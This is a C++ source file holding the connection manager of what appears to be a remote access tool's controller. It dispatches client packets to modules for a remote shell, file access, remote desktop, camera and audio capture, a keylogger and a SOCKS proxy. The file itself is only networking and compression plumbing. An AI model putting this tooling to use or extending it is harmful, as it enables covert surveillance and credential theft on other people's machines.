#include "stdafx.h"
#include "Manager.h"
#include"IOCPServer.h"
#include "Packet.h"
#include "MsgHandler.h"
#include "ClientContext.h"
#include "KernelSrv.h"
#include "MiniFileTransSrv.h"
#include "MiniDownloadSrv.h"
#include "CmdSrv.h"
#include "ChatSrv.h"
#include "FileManagerSrv.h"
#include "FileMgrSearchSrv.h"
#include "RemoteDesktopSrv.h"
#include "CameraSrv.h"
#include "AudioSrv.h"
#include "MainFrm.h"
#include "KeybdLogSrv.h"
#include "SocksProxySrv.h"
#include "zlib\zlib.h"
#include "InvalidHandler.h"

#include "utils.h"

#define ENABLE_COMPRESS 1

#define MSG_COMPRESS	0x80000000

#ifdef DEBUG
#pragma comment(lib,"zlibd.lib")
#else
#pragma comment(lib,"zlib.lib")
#endif

CManager::CManager(HWND hNotifyWnd):
	m_hNotifyWnd(hNotifyWnd)
{
	InitializeCriticalSectionAndSpinCount(&m_cs, 4000);
}

CManager::~CManager()
{
	DeleteCriticalSection(&m_cs);
}

void CManager::add(CClientContext * pCtx, CMsgHandler*pHandler){
	lock();
	m_Ctx2Handler.insert(std::pair<void*, void*>(pCtx, pHandler));
	m_Handler2Ctx.insert(std::pair<void*, void*>(pHandler, pCtx));
	unlock();
}
void CManager::remove(CClientContext * pCtx, CMsgHandler*pHandler){
	lock();

	auto it = m_Ctx2Handler.find(pCtx);
	ASSERT(it != m_Ctx2Handler.end());
	m_Ctx2Handler.erase(it);

	it = m_Handler2Ctx.find(pHandler);
	ASSERT(it != m_Handler2Ctx.end());
	m_Handler2Ctx.erase(it);
	
	unlock();
}
CClientContext * CManager::handler2ctx(CMsgHandler*pHandler){
	CClientContext * pCtx = nullptr;
	lock();

	auto it = m_Handler2Ctx.find(pHandler);
	ASSERT(it != m_Handler2Ctx.end());
	pCtx = (CClientContext*)it->second;

	unlock();
	return pCtx;
}
CMsgHandler	   * CManager::ctx2handler(CClientContext*pCtx){
	CMsgHandler * pMsgHandler = nullptr;
	lock();

	auto it = m_Ctx2Handler.find(pCtx);
	ASSERT(it != m_Ctx2Handler.end());
	pMsgHandler =(CMsgHandler*)it->second;

	unlock();
	return pMsgHandler;
}

const pair<string, unsigned short> CManager::GetPeerName(CMsgHandler * pMsgHandler){
	SOCKADDR_IN  addr = { 0 };
	CClientContext * pCtx = handler2ctx(pMsgHandler);
	int namelen = sizeof(addr);
	getpeername(pCtx->m_ClientSocket, (sockaddr*)&addr, &namelen);
	return pair<string, unsigned short>(inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
}

const pair<string, unsigned short> CManager::GetSockName(CMsgHandler * pMsgHandler){
	SOCKADDR_IN  addr = { 0 };
	CClientContext * pCtx = handler2ctx(pMsgHandler);
	int namelen = sizeof(addr);
	getsockname(pCtx->m_ClientSocket, (sockaddr*)&addr, &namelen);
	return pair<string, unsigned short>(inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
}

//HandlerInit And HandlerTerm will be called in UI Thread.
BOOL CManager::handler_init(CClientContext*pClientContext, DWORD Identity)
{
	if (!pClientContext)
		return FALSE;

	CMsgHandler*pHandler = NULL;
	/**************************Create Handler*********************************/
	switch (Identity)
	{
	case KNEL:
		pHandler = new CKernelSrv(((CMainFrame*)AfxGetApp()->m_pMainWnd)->
			m_ClientList.GetSafeHwnd(),this);
		break;
	case MINIFILETRANS:
		pHandler = new CMiniFileTransSrv(this);
		break;
	case MINIDOWNLOAD:
		pHandler = new CMiniDownloadSrv(this);
		break;
	case CMD:
		pHandler = new CCmdSrv(this);
		break;
	case CHAT:
		pHandler = new CChatSrv(this);
		break;
	case FILE_MANAGER:
		pHandler = new CFileManagerSrv(this);
		break;
	case FILEMGR_SEARCH:
		pHandler = new CFileMgrSearchSrv(this);
		break;
	case REMOTEDESKTOP:
		pHandler = new CRemoteDesktopSrv(this);
		break;
	case CAMERA:
		pHandler = new CCameraSrv(this);
		break;
	case AUDIO:
		pHandler = new CAudioSrv(this);
		break;
	case KBLG:
		pHandler = new CKeybdLogSrv(this);
		break;
	case SOCKS_PROXY:
		pHandler = new CSocksProxySrv(this);
		break;
	default:
		pHandler = new CInvalidHandler(this);
		break;
	}

	ASSERT(pHandler);	
	add(pClientContext, pHandler);
	//
	pHandler->OnOpen();
	return TRUE;
}

BOOL CManager::handler_term(CClientContext*pClientContext, DWORD Identity){
	if (!pClientContext)
		return FALSE;

	CMsgHandler * pHandler = ctx2handler(pClientContext);
	pHandler->OnClose();

	//remove.
	remove(pClientContext, pHandler);
	delete pHandler;
	return TRUE;
}

void CManager::Close(CMsgHandler*pHandler){
	CClientContext *pCtx = handler2ctx(pHandler) ;// (CClientContext*)it->second;
	pCtx->Disconnect();
}

BOOL CManager::SendMsg(CMsgHandler*pHandler, WORD Msg, char*data, size_t len){
	CClientContext *pCtx = handler2ctx(pHandler);

	Byte * source = (Byte*)data;
	uLong source_len = len;
	DWORD dwFlag = 0;

	if (ENABLE_COMPRESS){
		uLong bufferSize = compressBound(source_len);
		Byte * compreeBuffer = new Byte[bufferSize];

		int err = compress(compreeBuffer, &bufferSize, source, source_len);
		if (err == S_OK){
			dwFlag = source_len;			//保存原始长度
			dwFlag |= MSG_COMPRESS;

			source = compreeBuffer;
			source_len = bufferSize;
		}
		else{
			//失败的话就不压缩....
			delete[] compreeBuffer;
		}
	}

	pCtx->SendPacket(Msg, (const char*)source, source_len, dwFlag);
	if (dwFlag & MSG_COMPRESS){
		delete[] source;
	}	
	return TRUE;
}

void CManager::DispatchMsg(CClientContext*pContext,CPacket*pPkt){
	CMsgHandler * pHandler = ctx2handler(pContext);

	WORD Msg			= pPkt->GetCommand();
	Byte * source		= (Byte*)pPkt->GetBody();
	uLong source_len	= pPkt->GetBodyLen();
	DWORD dwFlag		= pPkt->GetFlag();

	if (dwFlag & MSG_COMPRESS){
		uLong bufferSize = dwFlag & (~MSG_COMPRESS);
		Byte * uncompressBuffer = new Byte[bufferSize];
		int err = Z_OK;

		err = uncompress(uncompressBuffer, &bufferSize, source, source_len);
		if (err == Z_OK){
			source = uncompressBuffer;
			source_len = bufferSize;
		}
		else{
			delete[] uncompressBuffer;
			return;
		}
	}
	pHandler->OnReadMsg(Msg, source_len, (char*)source);
	if (dwFlag  &MSG_COMPRESS){
		delete[] source;
	}
}

void CManager::ProcessCompletedPacket(int type, CClientContext*pCtx, CPacket*pPacket){

	WORD Msg = 0;
	DWORD dwTotal = 0;
	DWORD dwRead = 0;
	DWORD dwWrite = 0;
	HRESULT hResult = 0;

	if (PACKET_ACCEPT_ABORT == type){
		///emmmmm...
	}

	if (PACKET_CLIENT_CONNECT == type){
		dbg_log("PACKET_CLIENT_CONNECT\n");
		if (!SendMessage(m_hNotifyWnd,
			WM_SOCKET_CONNECT, (WPARAM)pCtx, pCtx->m_Identity))
			pCtx->Disconnect();
		return;
	}

	if (PACKET_CLIENT_DISCONNECT == type){
		dbg_log("PACKET_CLIENT_DISCONNECT\n");
		SendMessage(m_hNotifyWnd, WM_SOCKET_CLOSE,
			(WPARAM)pCtx, pCtx->m_Identity);
		return;
	}

	if (PACKET_READ_COMPLETED == type){
		if (pPacket->GetCommand() == HEART_BEAT){
			//心跳包回复....
			pCtx->SendPacket(HEART_BEAT, 0, 0, 0);
			return;
		}
		//dbg_log("PACKET_READ_COMPLETED\n");
		DispatchMsg(pCtx, pPacket);
		return;
	}
}